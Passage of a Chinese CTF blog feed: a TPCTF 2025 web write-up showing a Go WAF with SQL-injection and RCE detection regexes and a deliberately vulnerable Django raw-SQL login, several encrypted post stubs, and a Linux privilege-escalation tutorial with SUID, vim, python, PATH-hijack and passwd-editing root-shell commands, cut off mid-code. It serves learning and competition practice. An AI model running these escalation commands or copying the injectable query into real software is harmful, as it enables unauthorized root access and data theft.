class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Printf(<span class="hljs-string">&quot;解析 Content-Type 失败: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> mediaType == <span class="hljs-string">&quot;multipart/form-data&quot;</span> &#123;<br><span class="hljs-keyword">if</span> err := r.ParseMultipartForm(<span class="hljs-number">65535</span>); err != <span class="hljs-literal">nil</span> &#123;<br>log.Printf(<span class="hljs-string">&quot;解析 POST 参数失败: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> err := r.ParseForm(); err != <span class="hljs-literal">nil</span> &#123;<br>log.Printf(<span class="hljs-string">&quot;解析 POST 参数失败: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span> key, values := <span class="hljs-keyword">range</span> r.PostForm &#123;<br>log.Printf(<span class="hljs-string">&quot;POST 参数 %s=%v&quot;</span>, key, values)<br><span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> values &#123;<br><span class="hljs-keyword">if</span> sqlInjectionPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;阻止 SQL 注入: POST 参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> rcePattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;阻止 RCE 攻击: POST 参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">if</span> hotfixPattern.MatchString(value) &#123;<br>log.Printf(<span class="hljs-string">&quot;POST 参数 %s=%s&quot;</span>, key, value)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">isBlockedUserAgent</span><span class="hljs-params">(userAgent <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> _, blocked := <span class="hljs-keyword">range</span> blockedUserAgents &#123;<br><span class="hljs-keyword">if</span> strings.Contains(strings.ToLower(userAgent), blocked) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">reverseProxyHandler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>clientIP := r.RemoteAddr<br><span class="hljs-keyword">if</span> isBlockedIP(clientIP) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Forbidden&quot;</span>, http.StatusForbidden)<br>log.Printf(<span class="hljs-string">&quot;阻止的 IP: %s&quot;</span>, clientIP)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>bodyBytes, err := io.ReadAll(r.Body)<br><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Bad Request&quot;</span>, http.StatusBadRequest)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>r.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))<br><br><span class="hljs-keyword">if</span> isMaliciousRequest(r) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Malicious request detected&quot;</span>, http.StatusForbidden)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> isBlockedUserAgent(r.UserAgent()) &#123;<br>http.Error(w, <span class="hljs-string">&quot;Forbidden User-Agent&quot;</span>, http.StatusForbidden)<br>log.Printf(<span class="hljs-string">&quot;阻止的 User-Agent: %s&quot;</span>, r.UserAgent())<br><span class="hljs-keyword">return</span><br>&#125;<br><br>proxyReq, err := http.NewRequest(r.Method, backendURL+r.RequestURI, bytes.NewBuffer(bodyBytes))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Bad Gateway&quot;</span>, http.StatusBadGateway)<br><span class="hljs-keyword">return</span><br>&#125;<br>proxyReq.Header = r.Header<br><br>client := &amp;http.Client&#123;<br>CheckRedirect: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(req *http.Request, via []*http.Request)</span></span> <span class="hljs-type">error</span> &#123;<br><span class="hljs-keyword">return</span> http.ErrUseLastResponse<br>&#125;,<br>&#125;<br><br>resp, err := client.Do(proxyReq)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>http.Error(w, <span class="hljs-string">&quot;Bad Gateway&quot;</span>, http.StatusBadGateway)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><br><span class="hljs-keyword">for</span> key, values := <span class="hljs-keyword">range</span> resp.Header &#123;<br><span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> values &#123;<br><span class="hljs-keyword">if</span> key == <span class="hljs-string">&quot;Location&quot;</span> &#123;<br>value = strings.Replace(value, backendHost, r.Host, <span class="hljs-number">-1</span>)<br>&#125;<br>w.Header().Add(key, value)<br>&#125;<br>&#125;<br>w.WriteHeader(resp.StatusCode)<br>io.Copy(w, resp.Body)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, reverseProxyHandler)<br>log.Println(<span class="hljs-string">&quot;Listen on 0.0.0.0:8080&quot;</span>)<br>log.Fatal(http.ListenAndServe(<span class="hljs-string">&quot;:8080&quot;</span>, <span class="hljs-literal">nil</span>))<br>&#125;<br><br></code></pre></td></tr></table></figure><p>viwe.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render<br><span class="hljs-keyword">from</span> django.db <span class="hljs-keyword">import</span> connection<br><br><span class="hljs-comment"># Create your views here.</span><br><span class="hljs-keyword">from</span> django.http <span class="hljs-keyword">import</span> HttpResponse,HttpRequest<br><span class="hljs-keyword">from</span> .models <span class="hljs-keyword">import</span> AdminUser,Blog<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request:HttpRequest</span>):<br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;Welcome to TPCTF 2025&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>(<span class="hljs-params">request:HttpRequest</span>):<br>    <span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;Welcome to TPCTF 2025&#x27;</span>)<br>    username = request.POST.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;you are not admin.&#x27;</span>)<br>    password = request.POST.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>    users:AdminUser = AdminUser.objects.raw(<span class="hljs-string">&quot;SELECT * FROM blog_adminuser WHERE username=&#x27;%s&#x27; and password =&#x27;%s&#x27;&quot;</span> % (username,password))<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">assert</span> password == users[<span class="hljs-number">0</span>].password<br>        <span class="hljs-keyword">return</span> HttpResponse(os.environ.get(<span class="hljs-string">&#x27;FLAG&#x27;</span>))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;wrong password&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>我们主要看两部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>(<span class="hljs-params">request:HttpRequest</span>):<br><span class="hljs-keyword">if</span> request.method != <span class="hljs-string">&#x27;POST&#x27;</span>:<br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;Welcome to TPCTF 2025&#x27;</span>)<br>username = request.POST.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br><span class="hljs-keyword">if</span> username != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;you are not admin.&#x27;</span>)<br>password = request.POST.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>users:AdminUser = AdminUser.objects.raw(<span class="hljs-string">&quot;SELECT * FROM blog_adminuser WHERE username=&#x27;%s&#x27; and password =&#x27;%s&#x27;&quot;</span> % (username,password))<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">assert</span> password == users[<span class="hljs-number">0</span>].password<br>    <span class="hljs-keyword">return</span> HttpResponse(os.environ.get(<span class="hljs-string">&#x27;FLAG&#x27;</span>))<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">&#x27;wrong password&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> sqlInjectionPattern = regexp.MustCompile(\<span class="hljs-string">`(?i)(union.\*select|select.\*from|insert.\*into|update.\*set|delete.\*from|drop\s+table|--|#|\\\*\\/|\\/\\\*)\`</span>)<br><br><span class="hljs-keyword">var</span> rcePattern = regexp.MustCompile(\<span class="hljs-string">`(?i)(\b(?:os|exec|system|eval|passthru|shell\_exec|phpinfo|popen|proc\_open|pcntl\_exec|assert)\s\*\\(.+\\))\`</span>)<br><br><span class="hljs-keyword">var</span> hotfixPattern = regexp.MustCompile(\<span class="hljs-string">`(?i)(select)\`</span>)<br></code></pre></td></tr></table></figure><p>卡了很久不知道怎么 bypass</p><p>看大佬的博客知道是要利用<code>multipart/form-data</code>来bypass😅又一个知识盲点 <a href="https://sym01.com/posts/2021/bypass-waf-via-boundary-confusion/">参考1</a><a href="https://www.cnblogs.com/throwable/p/15740444.html">参考2</a></p><p>代码发现限制为 admin</p><p>看到源码逻辑就是sql的<a href="https://www.anquanke.com/post/id/253570">quine注入</a>😅怎么这么古老的又拿来考啊，关键是我还不会</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250313000506076.png" alt="image-20250313000506076"></p><p>没有复现成功，环境有点问题</p><h2 id="thumbor-1"><a href="#thumbor-1" class="headerlink" title="thumbor 1"></a>thumbor 1</h2><p>看不懂,有机会复现吧</p><h2 id="thumbor-2"><a href="#thumbor-2" class="headerlink" title="thumbor 2"></a>thumbor 2</h2><p>难</p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>难度爆大</tag>
      
      <tag>xss</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CNEXT漏洞研究</title>
    <link href="/tuyi/2025/03/02/CNEXT%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    <url>/tuyi/2025/03/02/CNEXT%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7c61d2056093479cad791756f6bd4a1941b099c9116976da5b033af1ec91aa46">7389a4e37e9dabc8af72228f567f583bb5a45bd0f3a6f097aaa03e2b7f93f5d01c6a972f45fcd5e32e917f9e46f0a1ab08b53e9b5ad84ccac7dd269e3c4b3c3bceb8870b88672f4dfe3ca64a7ae5f83646d3edf72b74c0a2aae94f5d02e3834df2e30fe7a990ad1aae995af2fcdd00bfb6f9208cb4f3b1b20ce31a2a1d8e4bc7e92a7c0d432b800f6fff61957547c7255698f01c59ff6f0c9a9775c9e6418497316c574cf5a79761b1edbfd753c7c9c3b17e5bc7df14cf3d13e89af2263d6718ee3227db78c3137fff36b7bb57f2b66739508f773a55d1f8872e18a00a8dba40a82cc1ba6cb6e88b538ac204adf8fef8a64fcac38d0ad4c76f8fb52dfe59a5a68edbcbbc0ccefc9d29780736507d27402fef05d3ec4d207481c9ab433f58ccd5cf6fc1621114c3f5baf7a885f9606d71cf88f694181a76575a7b109e4d096b23e685b3e04ca5fbf32880360f26b8b1ca0e8516fee59b86cd6f38884f8705b541602bf62533797ee26ac17dae4f75a2d7bb104cc041e8f7df33fa61690cbb916af0cf31c69e0899d09995f04857370c7bdb32247cd96835b65ec6856f01dd39560c70b75e962e1872a07a17e9e0a7e70d2a4ff5187aa3154c55f7003698d2bced7514e376c01f4ee112026aa06abf1cab15a1c6b7c5b8a7a73d53e5ec15e58c86acb6fdfa7a510115f194d5d828352d9ff9e4a4dfa72fd165352a352447d5bf537d678e33d0f4e7fb4b71c3a7eb6b45db5bc7c55ef6f680ef6acea620bd2d73c0721067ef155efefcf147ddccc67e6f6e945c1ddde6b5deda60c08e63221b639010cbd556f788c2de6aad0c773a364e74461e5cc2a13269cffa11f4fa169804f272abe17d46227cd7200ed409e978b0941df0470209d4bfc2f0c2adffe02fddd4cb2f00f75a73b80fc1ad35cbaa7e591308640fb0d1e04d4db0f47ce82d6721eecf045cb2b54975a07b0a734999ca8d49cef2d756111e6b33a24ee073909ea53b7fa0d2299d6d1e3d5d8079fc12dba3b061887f24a87a7892c15521f8a7861262e3c00c0d31b0113e4ca56ef1e81a94fac97a974aae0e4bfddada01570bf05bd5890a9c6a4b4378150d0973cba20c10dc515b33f21724f3218eaaab83f239fdbc888474ecc6df22888b7d4e66a4a0038403015fc6b0a0fa7e269b18605bcf0d98311f1bc173e9cbc49b33a9c267e40bd725c2ed89bf007ac61f1205d719b42f3920a8a922e5d20a04f3eb13ba7b178e51b3189ec34d6a6b7efa90a427260afefcac52b37278ff4e50c70b813f0eade9d0c41735ac4079bb7ae785c276beb8b5ec46852784b47e7e791ea90ca9088858e8982c74e29c4e4f860104e390c3aacbbf0fa0152ef2b393d0ebe98f290805dd3326d3c3812753b1a91369eeff4365333dc282717c2bd6df1e514142943db635a19a34e04ba58a117ed5ed3b742bbb8db2e4c9c034a12e521b2f3cb8a8616e1908040eedf28dabb45b740a8249e2e85cb95649105b073a514138ad69dc112aa22d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>nssctf新手赛</title>
    <link href="/tuyi/2025/03/02/nssctf%E6%96%B0%E6%89%8B%E8%B5%9B/"/>
    <url>/tuyi/2025/03/02/nssctf%E6%96%B0%E6%89%8B%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f8997cda3688733ab14a58bff80cc9d2e37330196c154de2fe4484d3cc58f9a7"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlite注入</tag>
      
      <tag>linux提权</tag>
      
      <tag>时间盲注</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TRX_CTF_2025</title>
    <link href="/tuyi/2025/02/22/TRX-CTF-2025/"/>
    <url>/tuyi/2025/02/22/TRX-CTF-2025/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="33f83c5bc9019f05bfd07d66ce55b6b321bf8801069253b4882bf14ef6d561e2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NPC2CTF</title>
    <link href="/tuyi/2025/02/17/NPC2CTF/"/>
    <url>/tuyi/2025/02/17/NPC2CTF/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误，请重试。" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4d0b1352c32b60b49366faa26c437e651fd7a275a09b6db11d94707fc0bc24f8"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/tuyi/lib/hbe.js"></script><link href="/tuyi/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux提权</title>
    <link href="/tuyi/2025/02/15/linux%E6%8F%90%E6%9D%83/"/>
    <url>/tuyi/2025/02/15/linux%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><p>SUID是一种特殊权限，设置了suid的程序文件，在用户执行该程序时，用户的权限是该程序文件属主的权限，例如程序文件的属主是root，那么执行该程序的用户就将暂时获得root账户的权限。sgid与suid类似，只是执行程序时获得的是文件属组的权限。passwd这个命令程序的权限设置，它就是设置了suid权限的<br><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215203606988.png" alt="image-20250215203606988"></p><p>注意以下几点：</p><ul><li><p>只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义.</p></li><li><p>命令执行者要对该程序文件拥有执行(x)权限.</p></li><li><p>命令执行者在执行该程序时获得该程序文件属主的身份.（利用点）</p></li><li><p>SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效</p></li></ul><h2 id="如何设置SUID"><a href="#如何设置SUID" class="headerlink" title="如何设置SUID"></a>如何设置SUID</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> u+s filename 设置SUID位<br><span class="hljs-built_in">chmod</span> u-s filename 去掉SUID设置<br></code></pre></td></tr></table></figure><h2 id="常见的可以用来提权的命令"><a href="#常见的可以用来提权的命令" class="headerlink" title="常见的可以用来提权的命令"></a>常见的可以用来提权的命令</h2><p>如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap<br>vim<br>find<br>bash<br>more<br>less<br>nano<br><span class="hljs-built_in">cp</span><br>awk<br><span class="hljs-built_in">mv</span><br></code></pre></td></tr></table></figure><h2 id="查找SUID权限"><a href="#查找SUID权限" class="headerlink" title="查找SUID权限"></a>查找SUID权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> &#123;&#125; \; 2&gt;/dev/null<br></code></pre></td></tr></table></figure><h2 id="find提权"><a href="#find提权" class="headerlink" title="find提权"></a>find提权</h2><p>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用<br>SUID权限运行，则可以通过find执行的命令都将以root身份去运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> anyfile <span class="hljs-comment">#必须要有这个文件</span><br>find anyfile -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \; <span class="hljs-comment">#执行任意命令</span><br>find . -<span class="hljs-built_in">exec</span> /bin/sh -p  <span class="hljs-comment">#通过-p开启root权限shell</span><br></code></pre></td></tr></table></figure><h2 id="bash提权"><a href="#bash提权" class="headerlink" title="bash提权"></a>bash提权</h2><p>bash命令是用来打开一个shell。同时它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过bash执行的命令都将以root身份去运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -p<br></code></pre></td></tr></table></figure><p>开启root终端</p><h2 id="vim提权"><a href="#vim提权" class="headerlink" title="vim提权"></a>vim提权</h2><p>利用vim提权的思路是修改&#x2F;etc&#x2F;passwd文件和&#x2F;etc&#x2F;shadow，为自己添加一个有root权限的用户</p><p>1.利用vim添加账号</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/passwd 添加特权用户<br>添加：hacker:x:0:0::/home/hacker:/bin/bash<br>vim /etc/shadow 添加特权用户<br>hacker:$1$salt<span class="hljs-variable">$638tR8bROOvPnPklDQ9Vf</span>/:19103:0:99999:7::: 密码是123456<br>su hacker<br></code></pre></td></tr></table></figure></blockquote><p>2.利用vim打开交互shell</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim -c <span class="hljs-string">&#x27;:py import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>通过-c运行代码，用过python打开root终端</p></blockquote><h2 id="python-python3提权"><a href="#python-python3提权" class="headerlink" title="python&#x2F;python3提权"></a>python&#x2F;python3提权</h2><p>通过<code>-c</code>执行命令打开终端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h1><p>linux计划任务提权是因为权限配置不当，计划任务以root权限运行，低权限的用户可以修改计划任务的文件，从而被攻击者利用，导致提权，Linux计划任务命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">crontab -e 编辑计划任务<br>crontab -l 查看计划任务<br>crontab -r 删除目前的crontab<br></code></pre></td></tr></table></figure><p>计划任务的文件夹在<code> /etc/cron*</code>下</p><p>条件：</p><ul><li>计划任务的权限是777或者是suid</li></ul><p>提权方法：</p><ul><li>先查看是不是存在高权限的计划任务</li><li>追加命令放入文件内</li><li>外带出执行结果 反弹shell 写文件等</li></ul><h1 id="环境变量劫持提权"><a href="#环境变量劫持提权" class="headerlink" title="环境变量劫持提权"></a>环境变量劫持提权</h1><p>PATH是Linux和类Unix操作系统中的环境变量，当我们执行一个命令的时候shell会先检查命令是否是系统内部命令，如果不是则会再去检查此命令是否是一个应用程序，shell会试着从PATH中逐步查找命令，我们就增加环境变量让shell先找到我们的文件</p><p>条件：</p><ul><li>文件时suid权限，命令不是直接执行系统命令</li></ul><p>假如文件内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>setuid(<span class="hljs-number">0</span>);<br>setgid(<span class="hljs-number">0</span>);<br>system(<span class="hljs-string">&quot;cat /etc/shadow&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>是使用的是<code>cat</code>而不是<code>/bin/cat</code>如果这个文件的权限是suid那么我们就可以环境变量劫持</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/bash\n/bin/bash&quot;</span> &gt; /tmp/cat <span class="hljs-comment">#写入我们的命令</span><br><span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">cat</span>   <span class="hljs-comment">#给执行权限</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span> <span class="hljs-comment">#增加环境变量</span><br>执行原命令<br><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p>拿到权限</p><h1 id="SUDO提权"><a href="#SUDO提权" class="headerlink" title="SUDO提权"></a>SUDO提权</h1><p><a href="https://www.huangmj.com/17116743651246.html#12-sudo-dd">Linux提权之Sudo 70种提权方法</a></p><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。</p><p>但是想获取哪些命令设置了无密码sudo，还是需要查看 cat &#x2F;etc&#x2F;sudoers 文件或者 sudo -l 命令，而这两条命令都需要一定权限或者知道当前用户密码 </p><p>提权的命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">一条命令提权的<br><span class="hljs-built_in">sudo</span> vim -c <span 